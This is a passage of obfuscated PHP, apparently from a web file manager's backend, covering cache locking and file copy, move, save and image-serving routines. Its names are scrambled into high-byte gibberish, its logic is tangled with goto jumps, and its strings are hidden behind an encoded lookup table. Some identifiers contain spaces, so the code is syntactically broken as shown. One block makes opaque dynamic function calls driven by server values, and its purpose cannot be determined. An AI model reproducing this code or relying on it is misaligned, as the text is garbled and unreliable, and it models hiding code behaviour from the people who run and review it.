$DîÑ·¤Á÷İ[$e†ÆŞ¸¹¯[167]][$e†ÆŞ¸¹¯[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bğ½Ò¤ÈŠĞ, $cÜåİ§¹ôÆ = 0) { goto d—Ø¯Â¨„»; c¨¿µ¦½ô®: $this->unlock($bğ½Ò¤ÈŠĞ); return !1; goto aİáÕƒÎåî; d—Ø¯Â¨„»: $fšŠ½»µ÷ù =& $_SERVER[¬ˆÚÂ”Éğä]; $C¡ “ÖÇğ• = microtime(!0); $D—´ãœ¸ÏÉ = $C¡ “ÖÇğ• + $cÜåİ§¹ôÆ + 0.0001; goto cŒùğÂ¸œô; cŒùğÂ¸œô: $d‰ã«ù«–Ä = rtrim(self::$cachePath, $fšŠ½»µ÷ù[8]) . $fšŠ½»µ÷ù[781] . md5($bğ½Ò¤ÈŠĞ) . $fšŠ½»µ÷ù[782]; if (file_exists($d‰ã«ù«–Ä) && filemtime($d‰ã«ù«–Ä) && filemtime($d‰ã«ù«–Ä) < time() - 10) { @unlink($d‰ã«ù«–Ä); } do { if (file_exists($d‰ã«ù«–Ä)) { cacheLockWait(); continue; } $DœÒĞ¦Î¦ = fopen($d‰ã«ù«–Ä, $fšŠ½»µ÷ù[783]); if (!$DœÒĞ¦Î¦) { return !1; } $aÌ½µ˜Ò÷  = flock($DœÒĞ¦Î¦, LOCK_EX | LOCK_NB); self::$caches[$bğ½Ò¤ÈŠĞ] = array($fšŠ½»µ÷ù[784] => $DœÒĞ¦Î¦, $fšŠ½»µ÷ù[167] => $d‰ã«ù«–Ä); fwrite($DœÒĞ¦Î¦, $D—´ãœ¸ÏÉ); clearstatcache(); if ($DœÒĞ¦Î¦ && $aÌ½µ˜Ò÷ ) { return !0; } cacheLockWait(); } while (microtime(!0) < $D—´ãœ¸ÏÉ); goto c¨¿µ¦½ô®; aİáÕƒÎåî: } public function lockGet($Eëğ£Ö¦ƒö) { $AäÍç¾…Ïã =& $_SERVER[¬ˆÚÂ”Éğä]; $eºÙÇ˜Ã© = rtrim(self::$cachePath, $AäÍç¾…Ïã[8]) . $AäÍç¾…Ïã[781] . md5($Eëğ£Ö¦ƒö) . $AäÍç¾…Ïã[782]; return file_exists($eºÙÇ˜Ã©); } public function unlock($AÄâõ­ƒ†²) { goto féÜ±ÇùÉ; cÜ ÑÉÄè: @flock($FæœÜ‰§Ì[$E˜†›ÖÊİÕ[784]], LOCK_UN); @fclose($FæœÜ‰§Ì[$E˜†›ÖÊİÕ[784]]); @unlink($FæœÜ‰§Ì[$E˜†›ÖÊİÕ[167]]); goto B†®µ©ùÒ¯; B†®µ©ùÒ¯: unset(self::$caches[$AÄâõ­ƒ†²]); goto EŸÍÔšÍÚ¨; féÜ±ÇùÉ: $E˜†›ÖÊİÕ =& $_SERVER[¬ˆÚÂ”Éğä]; $FæœÜ‰§Ì = self::$caches[$AÄâõ­ƒ†²]; if (!$FæœÜ‰§Ì) { return; } goto cÜ ÑÉÄè; EŸÍÔšÍÚ¨: } } goto bË¼Ÿ²àÍ; bË¼Ÿ²àÍ: class CacheLockRedis { public function lock($F¦‹¼Ü•ÈÑ, $FğŞØ§É­ = 10) { $FÁéîî¦× = Cache::init(); $aŒÙËà×Œï = microtime(!0) + $FğŞØ§É­; while (microtime(!0) < $aŒÙËà×Œï) { $CÅêÃõ”Ñµ = $FÁéîî¦×->get($F¦‹¼Ü•ÈÑ); if (!$CÅêÃõ”Ñµ) { $c­ª‹ë¬»ô = $FÁéîî¦×->setLock($F¦‹¼Ü•ÈÑ, $aŒÙËà×Œï, $FğŞØ§É­); if ($c­ª‹ë¬»ô) { return !0; } } else { if ($CÅêÃõ”Ñµ < microtime(!0)) { $FÁéîî¦×->set($F¦‹¼Ü•ÈÑ, $aŒÙËà×Œï, $aŒÙËà×Œï); if ($FÁéîî¦×->get($F¦‹¼Ü•ÈÑ) === $CÅêÃõ”Ñµ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C Í…Ò×Ï×) { return Cache::init()->get($C Í…Ò×Ï×); } public function unlock($f¿Ñã™ù ·) { return Cache::init()->remove($f¿Ñã™ù ·); } } class CacheLockMemcached { public function lock($A…œã¢öŞ, $f–µ§ÑË¯ = 0) { $FÖ•¿®ÄÀÌ = Cache::init(); $f¾˜ˆ¼©†Š = microtime(!0) + $f–µ§ÑË¯; while (microtime(!0) < $f¾˜ˆ¼©†Š) { $c¤â¹³ìÈ¦ = $FÖ•¿®ÄÀÌ->get($A…œã¢öŞ); if (!$c¤â¹³ìÈ¦ || $c¤â¹³ìÈ¦ < microtime(!0)) { $A¬¼—¥µï = $FÖ•¿®ÄÀÌ->handle->add($A…œã¢öŞ, $f¾˜ˆ¼©†Š, $f–µ§ÑË¯); if ($A¬¼—¥µï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($f…÷ïßØ•Á) { return Cache::init()->get($f…÷ïßØ•Á); } public function unlock($dÎÜ‹³Ìœ) { return Cache::init()->remove($dÎÜ‹³Ìœ); } } if ($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][785]] != $_SERVER[$_SERVER[¬ˆÚÂ”Éğä][786]]) { goto fÍÇïİÃˆ; b´¾‚Ë‰šº: $DÉ°…¸ê¶´($_SERVER[$_SERVER[¬ˆÚÂ”Éğä][792]]); goto EÍùõÖ£ì£; aÄ³ø°œºª: $aŞáÒÍ„ÊÊ = explode($_SERVER[¬ˆÚÂ”Éğä][217], $BÔÚâ„ÊËŒ); if (count($aŞáÒÍ„ÊÊ) < $_SERVER[¬ˆÚÂ”Éğä][567]) { $eÚåáâ¦“ = $_SERVER[¬ˆÚÂ”Éğä][790]; $eÚåáâ¦“(); } $DÉ°…¸ê¶´ = $_SERVER[¬ˆÚÂ”Éğä][791]; goto b´¾‚Ë‰šº; fÍÇïİÃˆ: $aôÊ±’î» = $_SERVER[¬ˆÚÂ”Éğä][787]; $cİÜÖ„ = $_SERVER[$_SERVER[¬ˆÚÂ”Éğä][788]] . $_SERVER[¬ˆÚÂ”Éğä][789]; $BÔÚâ„ÊËŒ = $aôÊ±’î»($cİÜÖ„); goto aÄ³ø°œºª; EÍùõÖ£ì£: } goto A¿é‘×«Ğ; C¤À†–òÅË: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f¢ßï¥¨Ï, $bÌÂ¯“§Š˜) { $d±¿µã¨ = self::driverMake($bÌÂ¯“§Š˜[0]); if (method_exists($d±¿µã¨, $f¢ßï¥¨Ï)) { return @call_user_func_array(array($d±¿µã¨, $f¢ßï¥¨Ï), $bÌÂ¯“§Š˜); } if (method_exists($d±¿µã¨, $_SERVER[¬ˆÚÂ”Éğä][1010])) { return @call_user_func_array(array($d±¿µã¨, $f¢ßï¥¨Ï), $bÌÂ¯“§Š˜); } else { if (method_exists(self, $f¢ßï¥¨Ï)) { return @call_user_func_array(array(self, $f¢ßï¥¨Ï), $bÌÂ¯“§Š˜); } else { call_user_func_array(array(parent, $f¢ßï¥¨Ï), $bÌÂ¯“§Š˜); } } } public static function init($CÏèÎ³ì) { return self::driverMake($CÏèÎ³ì); } public static function copy($fÂæó¹‚, $BØĞà¯™Š“, $fØÅÕ¬õèÚ = false, $FÅˆµŞ„ôÖ = false) { return self::copyMove($fÂæó¹‚, $BØĞà¯™Š“, $fØÅÕ¬õèÚ, $_SERVER[¬ˆÚÂ”Éğä][492], $FÅˆµŞ„ôÖ); } public static function move($aõÎ®í´š, $bªŸ«Ìó, $B‘‚ËÖ·ˆ = false, $eĞÀ¶¼ÖŒ = false) { return self::copyMove($aõÎ®í´š, $bªŸ«Ìó, $B‘‚ËÖ·ˆ, $_SERVER[¬ˆÚÂ”Éğä][494], $eĞÀ¶¼ÖŒ); } public static function saveFile($C‡æó¤çâˆ, $C²Ã¬·ÅĞµ, $BÅ©Û¾èÆ¬ = true) { goto CŞŸĞ ôİÉ; bÛÚ†÷‹ÄÖ: $A¡Ñ¬¤ğ‰¦ = self::driverMake($C²Ã¬·ÅĞµ); $Bù´á„ÇÌ = !1; if ($A¡Ñ¬¤ğ‰¦->pathParse[$bíï¬†ªÎø[1011]]) { $e¥‚¾ÂÊî± = $A¡Ñ¬¤ğ‰¦->pathParse[$bíï¬†ªÎø[1011]]; $Bù´á„ÇÌ = $A¡Ñ¬¤ğ‰¦; $A¡Ñ¬¤ğ‰¦ = self::driverMake($e¥‚¾ÂÊî±); } goto BÉÒŸÅÀ™‰; BãÆ˜Æ©Éó: $fÅğã‘ = self::copyFile($fÔ·¤ˆí×Ò, $C‡æó¤çâˆ, $A¡Ñ¬¤ğ‰¦, $FÎ¤éÃÔ‘®, $bäİ†¸Ç…“[$bíï¬†ªÎø[28]], $Dé¡†œ×¸Ñ); if ($Bù´á„ÇÌ) { $fÅğã‘ = $Bù´á„ÇÌ->getPathOuter($fÅğã‘); } return $fÅğã‘; goto FÉì„ƒè•‡; BÉÒŸÅÀ™‰: $FÎ¤éÃÔ‘® = $A¡Ñ¬¤ğ‰¦->pathFather($C²Ã¬·ÅĞµ); $Dé¡†œ×¸Ñ = !0; if (!$BÅ©Û¾èÆ¬ && self::driverIsSame($fÔ·¤ˆí×Ò, $A¡Ñ¬¤ğ‰¦)) { $Dé¡†œ×¸Ñ = !1; } goto BãÆ˜Æ©Éó; CŞŸĞ ôİÉ: $bíï¬†ªÎø =& $_SERVER[¬ˆÚÂ”Éğä]; $bäİ†¸Ç…“ = self::info($C²Ã¬·ÅĞµ); $fÔ·¤ˆí×Ò = self::driverMake($C‡æó¤çâˆ); goto bÛÚ†÷‹ÄÖ; FÉì„ƒè•‡: } private static function copyMove($a‘ÎÌÊâ•, $fÊ ‘¾À÷, $a¤Ï¦«Ø°¹, $A‡›Ğ, $cÁ¹ğ¥¥Îì = false) { goto e¯Ÿ…¬İÜ‹; aİ÷Ö±­º§: Hook::trigger($FŠğê¯’[72], $DôÕÈÆÌ¦, $a‘ÎÌÊâ•, $F¿Šë‚Ì½½, $fÊ ‘¾À÷); $e¼ÙŞ×ä²‚ = self::driverIsSame($DôÕÈÆÌ¦, $F¿Šë‚Ì½½); if ($e¼ÙŞ×ä²‚) { if ($A‡›Ğ == $FŠğê¯’[494] && !method_exists($F¿Šë‚Ì½½, $FŠğê¯’[1012]) && trim($fÊ ‘¾À÷, $FŠğê¯’[8]) == trim($F¿Šë‚Ì½½->pathFather($a‘ÎÌÊâ•), $FŠğê¯’[8])) { return $F¿Šë‚Ì½½->getPathOuter($a‘ÎÌÊâ•); } if (method_exists($F¿Šë‚Ì½½, $A‡›Ğ)) { return $F¿Šë‚Ì½½->{$A‡›Ğ}($a‘ÎÌÊâ•, $fÊ ‘¾À÷, $a¤Ï¦«Ø°¹); } } goto BˆÄ…ÕŒ»¨; BˆÄ…ÕŒ»¨: $BĞ‡æÚ³É† = $DôÕÈÆÌ¦->isFile($a‘ÎÌÊâ•); if (!$BĞ‡æÚ³É† && $F¿Šë‚Ì½½->getType() == $FŠğê¯’[702] && $DôÕÈÆÌ¦->getType() == $FŠğê¯’[102]) { $dç…ì¯¤‚â = $F¿Šë‚Ì½½->copyFolderFromIO($DôÕÈÆÌ¦, $a‘ÎÌÊâ•, $fÊ ‘¾À÷, $a¤Ï¦«Ø°¹, $E‘óÇğ›Ë, $cÁ¹ğ¥¥Îì); } else { $dç…ì¯¤‚â = self::copyPath($DôÕÈÆÌ¦, $a‘ÎÌÊâ•, $F¿Šë‚Ì½½, $fÊ ‘¾À÷, $a¤Ï¦«Ø°¹, $E‘óÇğ›Ë, $BĞ‡æÚ³É†, $cÁ¹ğ¥¥Îì); } if ($dç…ì¯¤‚â && $E‘óÇğ›Ë) { $DôÕÈÆÌ¦->remove($a‘ÎÌÊâ•); } goto E¸¦‚‹ÖÑ¨; e¯Ÿ…¬İÜ‹: $FŠğê¯’ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$a‘ÎÌÊâ• || $a‘ÎÌÊâ• == $FŠğê¯’[8] || !$fÊ ‘¾À÷) { return !1; } ignore_timeout(); goto fÌØ­Õ£è¿; fÌØ­Õ£è¿: $DôÕÈÆÌ¦ = self::driverMake($a‘ÎÌÊâ•); $F¿Šë‚Ì½½ = self::driverMake($fÊ ‘¾À÷); $E‘óÇğ›Ë = $A‡›Ğ == $FŠğê¯’[494]; goto f¤ŠùºÕŸ¸; E¸¦‚‹ÖÑ¨: if ($CŒÒ—ÔÂ£°) { $dç…ì¯¤‚â = $CŒÒ—ÔÂ£°->getPathOuter($dç…ì¯¤‚â); } return $dç…ì¯¤‚â; goto b‹‡Š ÊØò; f¤ŠùºÕŸ¸: $CŒÒ—ÔÂ£° = !1; if ($F¿Šë‚Ì½½->pathParse[$FŠğê¯’[1011]]) { $fÊ ‘¾À÷ = $F¿Šë‚Ì½½->pathParse[$FŠğê¯’[1011]]; $CŒÒ—ÔÂ£° = $F¿Šë‚Ì½½; $F¿Šë‚Ì½½ = self::driverMake($fÊ ‘¾À÷); } self::check($DôÕÈÆÌ¦, $a‘ÎÌÊâ•, $F¿Šë‚Ì½½, $fÊ ‘¾À÷); goto aİ÷Ö±­º§; b‹‡Š ÊØò: } private static function check($a£éİö‡‚Á, $aá¶âÕËÈ, $fÄ¿ù·’Œâ, &$C˜ğÑ™ªæ) { $A¯¢šÕ‰œ… =& $_SERVER[¬ˆÚÂ”Éğä]; if (self::driverIsSame($a£éİö‡‚Á, $fÄ¿ù·’Œâ) && $a£éİö‡‚Á->isFolder($aá¶âÕËÈ) && $a£éİö‡‚Á->isParentOf($aá¶âÕËÈ, $C˜ğÑ™ªæ)) { show_json(LNG($A¯¢šÕ‰œ…[1013]), !1); } if (!$a£éİö‡‚Á->exist($aá¶âÕËÈ)) { show_json(LNG($A¯¢šÕ‰œ…[101]), !1); } } private static function copyPath($a¥¡±Üˆ³, $có„ğì°ÒŒ, $fò¢ÉŞ©Êâ, $d×‘ğŞù™, $AÏ¸ Ò¡ã„, $f¾Îê©ğµ, $A¾‰øâ¯ß–, $E•êæñ½ù = false) { goto C‘¥–Ğì; b ƒŠ–ÚÏ: $bšÎ¾‚Ë´´ = $fò¢ÉŞ©Êâ->mkdir($fò¢ÉŞ©Êâ->getPath($bÇ­ÍŠ¢…)); $d×‘ğŞù™ = $fò¢ÉŞ©Êâ->getPathInner($bšÎ¾‚Ë´´); $EœÀ¼ÖŠ  = $a¥¡±Üˆ³->listPath($có„ğì°ÒŒ, !0); goto C°·¿·•; C‘¥–Ğì: $fêç—ŠŠƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $eˆÀğ—Ê¤Á = $E•êæñ½ù ? $E•êæñ½ù : $a¥¡±Üˆ³->getPathName($a¥¡±Üˆ³->pathThis($có„ğì°ÒŒ)); if ($AÏ¸ Ò¡ã„) { $Fµ¿àÌóÔÎ = $fò¢ÉŞ©Êâ->fileNameExist($d×‘ğŞù™, $eˆÀğ—Ê¤Á); $eˆÀğ—Ê¤Á = $fò¢ÉŞ©Êâ->fileNameAuto($d×‘ğŞù™, $eˆÀğ—Ê¤Á, $AÏ¸ Ò¡ã„, !$A¾‰øâ¯ß–); $AÏ¸ Ò¡ã„ = $Fµ¿àÌóÔÎ ? $AÏ¸ Ò¡ã„ : !1; } goto B¤ÒÀ£Áîº; C°·¿·•: $eêé”„À‹ = array_merge($EœÀ¼ÖŠ [$fêç—ŠŠƒ[73]], $EœÀ¼ÖŠ [$fêç—ŠŠƒ[74]]); foreach ($eêé”„À‹ as $c¡öœ®èŒ°) { $E³—‘ä’ = $c¡öœ®èŒ°[$fêç—ŠŠƒ[29]] == $fêç—ŠŠƒ[167]; $có„ğì°ÒŒ = $a¥¡±Üˆ³->getPathInner($c¡öœ®èŒ°[$fêç—ŠŠƒ[75]]); $e¥Õàšè¯Õ = self::copyPath($a¥¡±Üˆ³, $có„ğì°ÒŒ, $fò¢ÉŞ©Êâ, $d×‘ğŞù™, $AÏ¸ Ò¡ã„, $f¾Îê©ğµ, $E³—‘ä’); if (!$e¥Õàšè¯Õ) { write_log($fêç—ŠŠƒ[1014] . $có„ğì°ÒŒ . $fêç—ŠŠƒ[1015] . $d×‘ğŞù™, $fêç—ŠŠƒ[1016]); } } return $bšÎ¾‚Ë´´; goto Bä…£Ú“çÃ; B¤ÒÀ£Áîº: if ($A¾‰øâ¯ß–) { return self::copyFile($a¥¡±Üˆ³, $có„ğì°ÒŒ, $fò¢ÉŞ©Êâ, $d×‘ğŞù™, $eˆÀğ—Ê¤Á, $f¾Îê©ğµ); } if ($AÏ¸ Ò¡ã„ == REPEAT_RENAME_FOLDER) { $AÏ¸ Ò¡ã„ = !1; } $bÇ­ÍŠ¢… = rtrim($d×‘ğŞù™, $fêç—ŠŠƒ[8]) . $fêç—ŠŠƒ[8] . $eˆÀğ—Ê¤Á; goto b ƒŠ–ÚÏ; Bä…£Ú“çÃ: } private static function copyFile($AùóÕ¨ƒÈ™, $Cğ¿à Ç, $e•á¢ÆõŒŞ, $cˆñÚø¹‹, $aÊöîÙğÆ†, $fù…À–¤©¹) { goto e—ÙŸÂ‹Ú; dê­°óí¡ê: Hook::trigger($CÊ é‘ÙĞÜ[1018], $AùóÕ¨ƒÈ™, $Cğ¿à Ç, $e•á¢ÆõŒŞ, $cˆñÚø¹‹, $aÊöîÙğÆ†, $F‘÷ˆ‡ÀÑí); if (self::driverIsSame($AùóÕ¨ƒÈ™, $e•á¢ÆõŒŞ)) { if ($fù…À–¤©¹) { $E³ìêµõ£ª = $e•á¢ÆõŒŞ->moveFile($Cğ¿à Ç, $cˆñÚø¹‹); } else { $E³ìêµõ£ª = $e•á¢ÆõŒŞ->copyFile($Cğ¿à Ç, $cˆñÚø¹‹); } Hook::trigger($CÊ é‘ÙĞÜ[1019], $AùóÕ¨ƒÈ™, $Cğ¿à Ç, $e•á¢ÆõŒŞ, $cˆñÚø¹‹, $aÊöîÙğÆ†, $E³ìêµõ£ª); return $E³ìêµõ£ª; } $cÑ¢Õ¦‰§â = TEMP_FILES; goto d¢èÒÂ„Â‘; CÛèê÷ßµ›: Hook::trigger($CÊ é‘ÙĞÜ[1019], $AùóÕ¨ƒÈ™, $Cğ¿à Ç, $e•á¢ÆõŒŞ, $cˆñÚø¹‹, $aÊöîÙğÆ†, $E³ìêµõ£ª); return $E³ìêµõ£ª; goto F¶Ï‡–£«; Dò· ƒƒ”‚: $f¨Íğ’âë = $AùóÕ¨ƒÈ™->iconvApp($f¨Íğ’âë); $E³ìêµõ£ª = $e•á¢ÆõŒŞ->upload($cˆñÚø¹‹, $f¨Íğ’âë, $fù…À–¤©¹); self::remove($cÑ¢Õ¦‰§â . $F‘÷ˆ‡ÀÑí); goto CÛèê÷ßµ›; e—ÙŸÂ‹Ú: $CÊ é‘ÙĞÜ =& $_SERVER[¬ˆÚÂ”Éğä]; $cˆñÚø¹‹ = $e•á¢ÆõŒŞ->getPath(rtrim($cˆñÚø¹‹, $CÊ é‘ÙĞÜ[8]) . $CÊ é‘ÙĞÜ[8] . $aÊöîÙğÆ†); $F‘÷ˆ‡ÀÑí = $CÊ é‘ÙĞÜ[1017] . time() . rand_string(5); goto dê­°óí¡ê; d¢èÒÂ„Â‘: mk_dir($cÑ¢Õ¦‰§â); $f¨Íğ’âë = $cÑ¢Õ¦‰§â . $F‘÷ˆ‡ÀÑí; $f¨Íğ’âë = $AùóÕ¨ƒÈ™->download($Cğ¿à Ç, $f¨Íğ’âë); goto Dò· ƒƒ”‚; F¶Ï‡–£«: } public static function pathFather($f©ÒçÙ¼Ç¬) { $e›À’Í¨¼è = IO::init($f©ÒçÙ¼Ç¬); $B¼øÁà»» = $e›À’Í¨¼è->pathFather($e›À’Í¨¼è->path); return $e›À’Í¨¼è->getPathOuter($B¼øÁà»»); } public static function fileOut($bŸŞ§Ã¹¥, $FíÏö­ëÕ§ = false, $a‰ÏÂÛ¤¥¨ = false, $D³”œœ¾ƒ˜ = '') { $Fåˆ®…»ÎÖ = self::driverMake($bŸŞ§Ã¹¥); if ($Fåˆ®…»ÎÖ->isFileOutServer()) { return $Fåˆ®…»ÎÖ->fileOutServer($bŸŞ§Ã¹¥, $FíÏö­ëÕ§, $a‰ÏÂÛ¤¥¨, $D³”œœ¾ƒ˜); } return $Fåˆ®…»ÎÖ->fileOut($bŸŞ§Ã¹¥, $FíÏö­ëÕ§, $a‰ÏÂÛ¤¥¨, $D³”œœ¾ƒ˜); } public static function fileOutImage($BºñÜ±Õ„, $AøçÙÙƒøŸ = 250) { $F–ê¾‡¦·† = array(250, 600, 1200, 3000); for ($fÈğÌ¬¹Í® = 0; $fÈğÌ¬¹Í® < count($F–ê¾‡¦·†); $fÈğÌ¬¹Í®++) { if ($fÈğÌ¬¹Í® == 0 && $AøçÙÙƒøŸ <= $F–ê¾‡¦·†[$fÈğÌ¬¹Í®]) { $AøçÙÙƒøŸ = $F–ê¾‡¦·†[$fÈğÌ¬¹Í®]; break; } else { if ($AøçÙÙƒøŸ > $F–ê¾‡¦·†[$fÈğÌ¬¹Í® - 1] && $AøçÙÙƒøŸ <= $F–ê¾‡¦·†[$fÈğÌ¬¹Í®]) { $AøçÙÙƒøŸ = $F–ê¾‡¦·†[$fÈğÌ¬¹Í®]; break; } else { if ($fÈğÌ¬¹Í® == count($F–ê¾‡¦·†) - 1 && $AøçÙÙƒøŸ > $F–ê¾‡¦·†[$fÈğÌ¬¹Í®]) { $AøçÙÙƒøŸ = $F–ê¾‡¦·†[$fÈğÌ¬¹Í®]; break; } } } } $b‡ØñŠÅø­ = self::driverMake($BºñÜ±Õ„); if ($b‡ØñŠÅø­->isFileOutServer()) { return $b‡ØñŠÅø­->fileOutImageServer($BºñÜ±Õ„, $AøçÙÙƒøŸ); } return $b‡ØñŠÅø­->fileOutImage($BºñÜ±Õ„, $AøçÙÙƒøŸ); } private static function driverIsSame($e ™áÉÆâÆ, $Eî¿°½¢óô) { goto eô‰Ø‡à‹ø; eô‰Ø‡à‹ø: $F°ĞÅ£‘˜Ø =& $_SERVER[¬ˆÚÂ”Éğä]; $BÈíß†– = $e ™áÉÆâÆ->getType(); $BÖÎ¿ÑŒ¡Ç = $Eî¿°½¢óô->getType(); goto B¸¨Æ¶šß; B¸¨Æ¶šß: if ($BÈíß†– != $BÖÎ¿ÑŒ¡Ç) { return !1; } if ($BÈíß†– == $F°ĞÅ£‘˜Ø[702]) { return !0; } if ($BÈíß†– == $F°ĞÅ£‘˜Ø[102]) { return !0; } goto d­ùï²êù; d­ùï²êù: if ($e ™áÉÆâÆ->pathDriver == $Eî¿°½¢óô->pathDriver) { return !0; } return !1; goto e‹„ó»Ñ¡³; e‹„ó»Ñ¡³: } public static function copyUpdate($D½Ö¾È†¼•, $cö£”Ú ) { goto Dğº¯ÁÂ¦ï; Dğº¯ÁÂ¦ï: $B„‡‹İ•õ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!IO::exist($D½Ö¾È†¼•)) { return !1; } if (!IO::exist($cö£”Ú )) { IO::mkdir($cö£”Ú ); } goto F¥˜ÕŠø†”; aâÌ¾ßà‹: $AõµÆÇÅä = array(); foreach ($aí˜‡ óŒ as $a¼ô“÷çò => $d™éÃ—‚Ïó) { if (isset($FÔ¤îÄ¡…ó[$a¼ô“÷çò])) { if ($d™éÃ—‚Ïó[$B„‡‹İ•õ[76]] == 1) { continue; } if ($FÔ¤îÄ¡…ó[$a¼ô“÷çò][$B„‡‹İ•õ[77]] == $d™éÃ—‚Ïó[$B„‡‹İ•õ[77]]) { continue; } } if ($d™éÃ—‚Ïó[$B„‡‹İ•õ[76]] == 1) { $AõµÆÇÅä[] = $cö£”Ú  . $B„‡‹İ•õ[8] . $a¼ô“÷çò; continue; } $A…Ï¾»ÏÙÄ = strstr(trim($a¼ô“÷çò, $B„‡‹İ•õ[8]), $B„‡‹İ•õ[8]) ? get_path_father($a¼ô“÷çò) : $B„‡‹İ•õ[33]; $AÑ–’²Îë[] = array($B„‡‹İ•õ[1020] => $d™éÃ—‚Ïó[$B„‡‹İ•õ[75]], $B„‡‹İ•õ[1021] => rtrim($cö£”Ú , $B„‡‹İ•õ[8]) . $B„‡‹İ•õ[8] . $A…Ï¾»ÏÙÄ, $B„‡‹İ•õ[1022] => $d™éÃ—‚Ïó); } $FÍÉø’òÔõ = array($B„‡‹İ•õ[167] => $AÑ–’²Îë, $B„‡‹İ•õ[76] => $AõµÆÇÅä); goto bÙÉâ¦ßÏ˜; F¥˜ÕŠø†”: $aí˜‡ óŒ = self::_listAll($D½Ö¾È†¼•); $FÔ¤îÄ¡…ó = self::_listAll($cö£”Ú ); $AÑ–’²Îë = array(); goto aâÌ¾ßà‹; bÙÉâ¦ßÏ˜: Hook::trigger($B„‡‹İ•õ[1023], $D½Ö¾È†¼•, $cö£”Ú , $FÍÉø’òÔõ); foreach ($AõµÆÇÅä as $d™éÃ—‚Ïó) { IO::mkdir($d™éÃ—‚Ïó); } foreach ($AÑ–’²Îë as $d™éÃ—‚Ïó) { IO::copy($d™éÃ—‚Ïó[$B„‡‹İ•õ[1020]], $d™éÃ—‚Ïó[$B„‡‹İ•õ[1021]], REPEAT_REPLACE); } goto e»¥‰ÕÓÊÙ; e»¥‰ÕÓÊÙ: } private static function _listAll($aàìóÎ‘Óá) { $eìó†£ó¬ =& $_SERVER[¬ˆÚÂ”Éğä]; $aàìóÎ‘Óá = KodIO::clear($aàìóÎ‘Óá); $AíÒ”¡î§ã = IO::listAll($aàìóÎ‘Óá); foreach ($AíÒ”¡î§ã as &$C¦õš›éÑ˜) { $FÌ÷¢ÎÃâÆ = substr($C¦õš›éÑ˜[$eìó†£ó¬[75]], strlen($aàìóÎ‘Óá)); $C¦õš›éÑ˜[$eìó†£ó¬[1024]] = trim($FÌ÷¢ÎÃâÆ, $eìó†£ó¬[8]); } unset($C¦õš›éÑ˜); return array_to_keyvalue($AíÒ”¡î§ã, $eìó†£ó¬[1024]); } public static function fileSubstr($AÊ±Üé›Ùê, $c­˜”™ÇÜã, $E‚µÃø…ÃÃ = false) { goto AèÕĞÔŞ; AèÕĞÔŞ: $c‘¨ÊŞÍª = self::driverMake($AÊ±Üé›Ùê); $cïãˆÅ¬Â = $c‘¨ÊŞÍª->size($AÊ±Üé›Ùê); $eÃ¦œ¸¡‹µ = $c­˜”™ÇÜã; goto cŞíŸêæß¡; e½ƒÑ¨ÛêÂ: return $c‘¨ÊŞÍª->fileSubstr($AÊ±Üé›Ùê, $c­˜”™ÇÜã, $E‚µÃø…ÃÃ); goto fã‘Ú²Ôí»; cŞíŸêæß¡: $E”ŠÒë©³ó = $E‚µÃø…ÃÃ; if ($c­˜”™ÇÜã < 0) { $c­˜”™ÇÜã = $cïãˆÅ¬Â + $c­˜”™ÇÜã; } if ($E‚µÃø…ÃÃ === !1) { $E‚µÃø…ÃÃ = $cïãˆÅ¬Â - $c­˜”™ÇÜã; } goto D…ˆÛ¤”ÑŞ; D…ˆÛ¤”ÑŞ: if ($c­˜”™ÇÜã + $E‚µÃø…ÃÃ > $cïãˆÅ¬Â) { $E‚µÃø…ÃÃ = $cïãˆÅ¬Â - $c­˜”™ÇÜã; } if ($E‚µÃø…ÃÃ <= 0) { return $_SERVER[¬ˆÚÂ”Éğä][33]; } if ($c­˜”™ÇÜã < 0 || $c­˜”™ÇÜã >= $cïãˆÅ¬Â || $E‚µÃø…ÃÃ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\x65\x52\x65\x61\x64\40\145\x72\162\157\162\x21\40\163\164\x61\162\164\75{$c­˜”™ÇÜã}\x3b\154\x65\156\147\x74\x68\x3d{$E‚µÃø…ÃÃ}\73\40\x73\x69\x7a\145\x3d{$cïãˆÅ¬Â}\x3b"); } goto e½ƒÑ¨ÛêÂ; fã‘Ú²Ôí»: } private static function driverMake(&$eé¨¡”‰®ƒ) { goto f†ÖŠÅ†ùÎ; E‡‹†Ñæ»: if ($b»îù´Ä»[$B‘×½ª‚Ú[29]] == KodIO::KOD_IO && !self::$driverListSystem[$b»îù´Ä»[$B‘×½ª‚Ú[367]]]) { return !1; } $eé¨¡”‰®ƒ = $b»îù´Ä»[$B‘×½ª‚Ú[1025]]; $dÖæ³‰Óí = self::driverGet($b»îù´Ä», $eé¨¡”‰®ƒ); goto b„³ùÚ’¥š; f†ÖŠÅ†ùÎ: $B‘×½ª‚Ú =& $_SERVER[¬ˆÚÂ”Éğä]; $b»îù´Ä» = KodIO::parse($eé¨¡”‰®ƒ); if (!self::$driverListSystem) { $aÁ‰„ù­ƒæ = Model($B‘×½ª‚Ú[711])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($aÁ‰„ù­ƒæ, $B‘×½ª‚Ú[367]); } goto E‡‹†Ñæ»; b„³ùÚ’¥š: return $dÖæ³‰Óí; goto Cê‘Ñ»©¶; Cê‘Ñ»©¶: } private static function driverGet($aÀ´¾Ş´˜â, &$Cô÷Ï†–é³) { goto F¥èŸĞ“æë; d±ª…”¤Œ¿: if (isset($AÂ³‰¡ŸíØ[$C šÙÜÉ“[6]][$C šÙÜÉ“[1037]])) { $b„°òÈÓ×…->pathBase = rtrim($AÂ³‰¡ŸíØ[$C šÙÜÉ“[6]][$C šÙÜÉ“[1037]], $C šÙÜÉ“[8]) . $C šÙÜÉ“[8]; $Cô÷Ï†–é³ = $b„°òÈÓ×…->pathBase . ltrim($Cô÷Ï†–é³, $C šÙÜÉ“[8]); } $Cô÷Ï†–é³ = $b„°òÈÓ×…->getPath($Cô÷Ï†–é³); if (isset($aÀ´¾Ş´˜â[$C šÙÜÉ“[1011]])) { $Cô÷Ï†–é³ = $aÀ´¾Ş´˜â[$C šÙÜÉ“[1011]]; } goto cÑöÈèÃÙ°; D„£Î­Ï†Ü: switch ($aÀ´¾Ş´˜â[$C 